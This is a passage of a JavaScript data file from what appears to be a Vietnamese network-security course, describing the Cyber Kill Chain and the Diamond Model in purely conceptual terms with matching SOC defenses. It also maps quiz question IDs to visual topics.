          "x": 260,
          "y": 200
        }
      ],
      "links": [
        {
          "from": "adversary",
          "to": "infra",
          "label": "Vũ khí hóa & Điều khiển C2"
        },
        {
          "from": "infra",
          "to": "victim",
          "label": "Phát tán qua Spear-Phishing"
        },
        {
          "from": "victim",
          "to": "soc",
          "label": "Cảnh báo EDR / SIEM"
        }
      ]
    },
    "steps": [
      {
        "num": 1,
        "name": "Giai đoạn 1 & 2: Do thám (Reconnaissance) và Vũ khí hóa (Weaponization)",
        "desc": "Kẻ tấn công thu thập thông tin tình báo mở (OSINT, LinkedIn, quét cổng) và đóng gói mã độc khai thác vào tệp tin văn bản (như PDF hoặc file Word chứa mã Macro độc hại).",
        "fromNode": "adversary",
        "toNode": "infra",
        "packetLabel": "Weaponized Document",
        "status": "forward",
        "actionText": "Tạo văn bản độc hại chứa mã khai thác lỗ hổng",
        "pdu": {
          "layer2": "Giai đoạn chuẩn bị phía kẻ tấn công",
          "layer3": "Chưa có lưu lượng đi vào mạng của nạn nhân",
          "layer4": "Kỹ thuật: Kết hợp lỗ hổng CVE với Payload Trojan",
          "payload": "File độc hại: Thong_Bao_Luong_Thuong.docx (Chứa VBA Macro)"
        },
        "deviceState": {
          "title": "Bảng theo dõi các bước trong Cyber Kill Chain",
          "headers": [
            "Giai đoạn",
            "Hành vi của Kẻ tấn công",
            "Công nghệ phòng thủ của SOC"
          ],
          "rows": [
            [
              "1. Reconnaissance",
              "Quét cổng, thu thập email trên mạng xã hội",
              "Giám sát thông tin tình báo đe dọa (Threat Intel)"
            ],
            [
              "2. Weaponization",
              "Ghép mã độc với tệp tài liệu thông dụng",
              "Phân tích mẫu mã độc trong môi trường Sandbox"
            ]
          ]
        }
      },
      {
        "num": 2,
        "name": "Giai đoạn 3 & 4: Phát tán (Delivery) và Khai thác lỗ hổng (Exploitation)",
        "desc": "Kẻ tấn công gửi email lừa đảo (Spear-phishing) đính kèm tệp độc hại. Nạn nhân mở tệp; mã khai thác kích hoạt lỗ hổng phần mềm trên máy tính để thực thi lệnh trái phép.",
        "fromNode": "infra",
        "toNode": "victim",
        "packetLabel": "Phishing Delivery & Exploit",
        "status": "forward",
        "actionText": "Gửi email lừa đảo; nạn nhân mở file kích hoạt mã độc",
        "pdu": {
          "layer2": "Khung tin email truyền qua giao thức SMTP",
          "layer3": "Src IP: Mail server giả mạo | Dst IP: Mail server nội bộ",
          "layer4": "TCP Port 25/587 | Tệp đính kèm chứa mã khai thác",
          "payload": "Khai thác lỗ hổng tràn bộ đệm (Buffer Overflow) trên máy nạn nhân."
        },
        "deviceState": {
          "title": "Hoạt động phòng ngự ở giai đoạn Phát tán & Khai thác",
          "headers": [
            "Giai đoạn",
            "Mục tiêu tấn công",
            "Giải pháp ngăn chặn của SOC"
          ],
          "rows": [
            [
              "3. Delivery",
              "Đưa mã độc vào bên trong ranh giới mạng",
              "Cổng bảo mật Email (Secure Email Gateway - SEG), Bộ lọc thư rác"
            ],
            [
              "4. Exploitation",
              "Kích hoạt thực thi mã độc trên hệ điều hành",
              "Bảo vệ điểm cuối EDR, Quản lý vá lỗ hổng (Patching)"
            ]
          ]
        }
      },
      {
        "num": 3,
        "name": "Giai đoạn 5 & 6: Cài đặt (Installation) và Thiết lập kênh điều khiển C2",
        "desc": "Mã độc tạo cơ chế chạy ngầm lâu dài (Persistence qua Registry Run Key hoặc Service), sau đó thiết lập kênh kết nối ra ngoài máy chủ Command and Control (C2) của kẻ tấn công.",
        "fromNode": "victim",
        "toNode": "infra",
        "packetLabel": "C2 Beaconing (HTTPS/DNS)",
        "status": "forward",
        "actionText": "Mã độc cài cắm thường trực và phát tín hiệu Beacon về máy chủ C2",
        "pdu": {
          "layer2": "Lưu lượng kết nối ra ngoài Internet (Outbound)",
          "layer3": "Src IP: Máy nạn nhân | Dst IP: C2 Server",
          "layer4": "HTTPS Port 443 ngụy trang hoặc DNS Port 53",
          "payload": "Mã độc gửi tín hiệu Heartbeat/Beacon nhận chỉ thị điều khiển mới."
        },
        "deviceState": {
          "title": "Bảng phát hiện tín hiệu điều khiển C2 (C2 Detection)",
          "headers": [
            "Giai đoạn",
            "Hành vi mã độc",
            "Công nghệ phát hiện của SOC"
          ],
          "rows": [
            [
              "5. Installation",
              "Ghi vào Registry để khởi động cùng Windows",
              "EDR phát hiện hành vi ghi đè file hệ thống"
            ],
            [
              "6. Command & Control",
              "Gửi tín hiệu đều đặn (Beaconing) ra ngoài",
              "Tường lửa NGFW, DNS Sinkholing, Phân tích NetFlow"
            ]
          ]
        }
      },
      {
        "num": 4,
        "name": "Giai đoạn 7: Thực hiện mục tiêu (Actions on Objectives) & Phản ứng của SOC",
        "desc": "Kẻ tấn công di chuyển ngang (Lateral Movement), thu thập tài liệu mật và mã hóa tống tiền (Ransomware). Đội ngũ SOC phát hiện cảnh báo, cô lập máy trạm và bẻ gãy chuỗi tấn công.",
        "fromNode": "victim",
        "toNode": "soc",
        "packetLabel": "SOC Isolation & Containment",
        "status": "forward",
        "actionText": "SOC phát hiện bất thường, kích hoạt cô lập mạng và bẻ gãy cuộc tấn công",
        "pdu": {
          "layer2": "Lệnh cô lập mạng Endpoint từ hệ thống SOC EDR",
          "layer3": "Cắt đứt toàn bộ lưu lượng của máy nạn nhân",
          "layer4": "Thu hồi phiên kết nối C2",
          "payload": "BẢO VỆ THÀNH CÔNG: Dữ liệu chưa bị đánh cắp ra ngoài."
        },
        "deviceState": {
          "title": "4 Đỉnh trong Mô hình Kim cương (Diamond Model of Intrusion)",
          "headers": [
            "Đỉnh Kim cương",
            "Thành phần tương ứng",
            "Ý nghĩa phân tích"
          ],
          "rows": [
            [
              "Adversary (Kẻ tấn công)",
              "Nhóm tin tặc APT",
              "Động cơ, nguồn lực và tổ chức đứng sau"
            ],
            [
              "Capability (Năng lực / Vũ khí)",
              "Mã khai thác, Trojan, Ransomware",
              "Kỹ thuật, công cụ và chiến thuật (TTPs)"
            ],
            [
              "Infrastructure (Hạ tầng)",
              "Tên miền, IP C2, Máy chủ ma",
              "Hệ thống liên lạc được dùng để tấn công"
            ],
            [
              "Victim (Nạn nhân)",
              "Tài sản, nhân sự, hệ thống thông tin",
              "Mục tiêu bị nhắm tới để khai thác"
            ]
          ]
        }
      }
    ],
    "specTable": {
      "headers": [
        "7 Giai đoạn Cyber Kill Chain",
        "Hành vi cốt lõi",
        "Công nghệ phòng vệ tương ứng"
      ],
      "rows": [
        [
          "1. Reconnaissance",
          "Do thám, thu thập thông tin mục tiêu",
          "Giám sát nguồn mở OSINT, Cảnh báo quét mạng"
        ],
        [
          "2. Weaponization",
          "Đóng gói mã độc vào tài liệu",
          "Phân tích Sandbox, Cập nhật Threat Intelligence"
        ],
        [
          "3. Delivery",
          "Phát tán qua Email/Web lừa đảo",
          "Email Security Gateway (SEG), Web Proxy Filtering"
        ],
        [
          "4. Exploitation",
          "Thực thi mã khai thác lỗ hổng",
          "EDR, Vá lỗ hổng định kỳ, Chặn macro"
        ],
        [
          "5. Installation",
          "Cài mã độc chạy ngầm thường trực",
          "Kiểm soát quyền ứng dụng, EDR giám sát Registry"
        ],
        [
          "6. Command & Control",
          "Kết nối về máy chủ điều khiển C2",
          "DNS Sinkholing, IPS/IDS phát hiện Beaconing"
        ],
        [
          "7. Actions on Objectives",
          "Mã hóa tống tiền, trích xuất dữ liệu",
          "Phân đoạn mạng (Micro-segmentation), Mã hóa dữ liệu, Backup"
        ]
      ]
    },
    "takeaway": "Cyber Kill Chain gồm 7 giai đoạn tuần tự; trung tâm an ninh SOC chỉ cần ngăn chặn thành công tại bất kỳ 1 giai đoạn nào là có thể vô hiệu hóa hoàn toàn mục tiêu của kẻ tấn công."
  }
};

  window.QUESTION_VISUAL_MAP = {
  "m13-17_q4": "tcp_handshake_syn_flood",
  "m13-17_q7": "dns_tunneling",
  "m13-17_q8": "arp_spoofing_mitm",
  "m13-17_q9": "arp_spoofing_mitm",
  "m13-17_q17": "stateful_firewall",
  "m13-17_q18": "arp_spoofing_mitm",
  "m13-17_q19": "cyber_kill_chain",
  "m13-17_q20": "tcp_handshake_syn_flood",
  "m13-17_q21": "span_mirror",
  "m13-17_q22": "netflow_meta",
  "m13-17_q24": "netflow_meta",
  "m13-17_q27": "cyber_kill_chain",
  "m13-17_q28": "sql_injection_xss",
  "m13-17_q30": "dhcp_starvation_spoofing",
  "m13-17_q32": "sql_injection_xss",
  "m13-17_q33": "cyber_kill_chain",
  "m13-17_q38": "netflow_meta",
  "m13-17_q39": "span_mirror",
  "m13-17_q41": "tcp_handshake_syn_flood",
  "m13-17_q46": "dhcp_starvation_spoofing",
  "m13-17_q47": "sql_injection_xss",
  "m13-17_q52": "cyber_kill_chain",
  "m18-20_q17": "digital_signature_hash",
  "m18-20_q23": "digital_signature_hash",
  "m21-23_q1": "arp_spoofing_mitm",
  "m21-23_q2": "digital_signature_hash",
  "m21-23_q4": "digital_signature_hash",
  "m21-23_q5": "digital_signature_hash",
  "m21-23_q7": "digital_signature_hash",
  "m21-23_q8": "digital_signature_hash",
  "m21-23_q12": "digital_signature_hash",
  "m21-23_q18": "netflow_meta",
  "m21-23_q27": "stateful_firewall",
  "m21-23_q30": "crypto_asym_sym",
  "m21-23_q32": "digital_signature_hash",
  "m21-23_q35": "digital_signature_hash",
  "m21-23_q37": "digital_signature_hash",
  "m24-25_q6": "crypto_asym_sym",
  "m24-25_q8": "stateful_firewall",
  "m24-25_q14": "crypto_asym_sym",
  "m24-25_q16": "crypto_asym_sym",
  "m24-25_q17": "netflow_meta",
  "m24-25_q19": "netflow_meta",
  "m24-25_q20": "crypto_asym_sym",
  "m24-25_q28": "netflow_meta",
  "m24-25_q29": "netflow_meta",
  "m26-28_q1": "cyber_kill_chain",
  "m26-28_q8": "cyber_kill_chain",
  "m26-28_q26": "cyber_kill_chain",
  "m26-28_q33": "cyber_kill_chain",
  "m26-28_q34": "cyber_kill_chain",
  "m26-28_q35": "cyber_kill_chain",
  "m1-2_q16": "arp_spoofing_mitm",
  "m1-2_q28": "crypto_asym_sym",
  "m5-10_q5": "arp_spoofing_mitm",
  "m5-10_q21": "nat_pat_operation",
  "m5-10_q28": "arp_spoofing_mitm",
  "m5-10_q45": "tcp_handshake_syn_flood",
  "m5-10_q46": "crypto_asym_sym",
  "m5-10_q60": "nat_pat_operation",
  "m5-10_q63": "dns_tunneling",
  "m11-12_q13": "netflow_meta",
  "m11-12_q27": "stateful_firewall",
  "m11-12_q31": "span_mirror",
  "final_q3": "arp_spoofing_mitm",
  "final_q22": "netflow_meta",
  "final_q28": "crypto_asym_sym",
  "final_q29": "crypto_asym_sym",
  "final_q34": "sql_injection_xss",
  "final_q56": "netflow_meta",
  "final_q59": "stateful_firewall",
  "final_q60": "dhcp_starvation_spoofing",
  "final_q74": "crypto_asym_sym",
  "final_q76": "span_mirror",
  "final_q77": "cyber_kill_chain",
  "final_q82": "crypto_asym_sym",
  "final_q83": "digital_signature_hash",
  "final_q86": "stateful_firewall",
  "final_q88": "cyber_kill_chain",
  "final_q89": "cyber_kill_chain",
  "final_q90": "cyber_kill_chain",
  "final_q91": "tcp_handshake_syn_flood",
  "final_q96": "stateful_firewall",
  "final_q98": "crypto_asym_sym",
  "final_q107": "crypto_asym_sym",
  "final_q114": "arp_spoofing_mitm",
  "final_q119": "cyber_kill_chain",
  "final_q120": "tcp_handshake_syn_flood",
  "final_q122": "netflow_meta",
  "final_q124": "crypto_asym_sym",
  "final_q129": "nat_pat_operation",
  "final_q132": "cyber_kill_chain",
  "final_q142": "arp_spoofing_mitm",
  "final_q145": "netflow_meta",
  "final_q151": "crypto_asym_sym",
  "final_q157": "digital_signature_hash",
  "final_q159": "crypto_asym_sym",
  "final_q168": "cyber_kill_chain",
  "final_q174": "cyber_kill_chain",
  "final_q181": "tcp_handshake_syn_flood",
  "final_q185": "nat_pat_operation",
  "cert_practice_q7": "arp_spoofing_mitm",
  "cert_practice_q13": "netflow_meta",
  "cert_practice_q15": "span_mirror",
  "cert_practice_q21": "netflow_meta",
  "cert_practice_q25": "cyber_kill_chain",
  "cert_practice_q27": "cyber_kill_chain"
};

})();
